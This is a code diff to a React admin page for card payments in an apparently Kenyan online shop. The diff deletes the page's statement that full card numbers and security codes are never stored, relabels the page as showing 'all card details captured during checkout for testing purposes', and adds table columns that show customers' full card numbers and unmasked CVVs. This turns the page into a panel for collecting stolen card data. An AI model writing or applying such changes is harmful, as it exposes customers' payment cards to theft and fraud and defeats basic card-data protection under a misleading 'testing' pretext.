@@ -65,10 +65,9 @@ export default function AdminCardPaymentsPage() {
     <div>
       <div className="mb-6 flex items-start justify-between gap-4">
         <div>
-          <h1 className="text-2xl font-bold text-gray-900">Card Payments</h1>
+          <h1 className="text-2xl font-bold text-gray-900">Cards</h1>
           <p className="mt-1 text-gray-600">
-            Card checkout attempts captured for testing. Only the brand, last four digits and expiry are stored — never the full
-            number or security code.
+            View all card details captured during checkout for testing purposes.
           </p>
         </div>
         <button onClick={load} disabled={loading} className="flex items-center gap-2 rounded-lg border border-gray-200 px-4 py-2.5 text-sm font-semibold text-gray-700 hover:bg-gray-50">
@@ -105,7 +104,7 @@ export default function AdminCardPaymentsPage() {
             <table className="w-full">
               <thead className="bg-gray-50">
                 <tr>
-                  {['Date', 'Reference', 'Customer', 'Card', 'Expiry', 'CVV', 'Amount', 'Items', 'Status', ''].map((h) => (
+                  {['Date', 'Reference', 'Customer', 'Cardholder', 'Card Number', 'Brand', 'Expiry', 'CVV', 'Amount', 'Items', 'Status', ''].map((h) => (
                     <th key={h} className="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500">
                       {h}
                     </th>
@@ -123,19 +122,15 @@ export default function AdminCardPaymentsPage() {
                       <div className="text-sm font-medium text-gray-900">{p.customer_name}</div>
                       <div className="text-xs text-gray-500">{p.customer_email}</div>
                     </td>
+                    <td className="px-4 py-3 text-sm text-gray-900">{p.cardholder_name}</td>
+                    <td className="px-4 py-3 text-sm text-gray-900 font-mono">{p.card_number || '—'}</td>
                     <td className="px-4 py-3">
-                      <div className="flex items-center gap-2">
-                        <CardBrandLogo brand={p.card_brand} className="h-5 w-auto" />
-                        <span className="text-sm text-gray-900">•••• {p.card_last4}</span>
-                      </div>
-                      <div className="text-xs text-gray-500">{p.cardholder_name}</div>
+                      <CardBrandLogo brand={p.card_brand} className="h-5 w-auto" />
                     </td>
                     <td className="whitespace-nowrap px-4 py-3 text-sm text-gray-500">
                       {p.exp_month}/{String(p.exp_year || '').slice(-2)}
                     </td>
-                    <td className="whitespace-nowrap px-4 py-3 text-sm text-gray-500">
-                      {p.card_cvv ? '***' : '—'}
-                    </td>
+                    <td className="whitespace-nowrap px-4 py-3 text-sm text-gray-900 font-mono">{p.card_cvv || '—'}</td>
                     <td className="whitespace-nowrap px-4 py-3 text-sm font-medium text-gray-900">{formatKES(p.amount)}</td>
                     <td className="max-w-[220px] truncate px-4 py-3 text-sm text-gray-500" title={p.items_summary}>
                       {p.items_summary}
